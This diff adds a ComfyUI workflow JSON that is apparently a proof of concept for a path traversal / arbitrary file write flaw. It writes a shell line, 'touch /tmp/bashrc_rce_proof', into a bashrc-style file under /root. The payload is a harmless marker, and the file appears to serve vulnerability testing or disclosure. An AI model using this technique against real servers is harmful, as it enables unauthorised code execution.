@@ -1,0 +1,21 @@
+{
+  "1": {
+    "class_type": "easy string",
+    "inputs": {
+      "value": "\n# Injected by ComfyUI path traversal\ntouch /tmp/bashrc_rce_proof\n"
+    }
+  },
+  "2": {
+    "class_type": "easy saveText",
+    "inputs": {
+      "text": [
+        "1",
+        0
+      ],
+      "output_file_path": "/root",
+      "file_name": ".bashrc_inject",
+      "file_extension": "txt",
+      "overwrite": true
+    }
+  }
+}
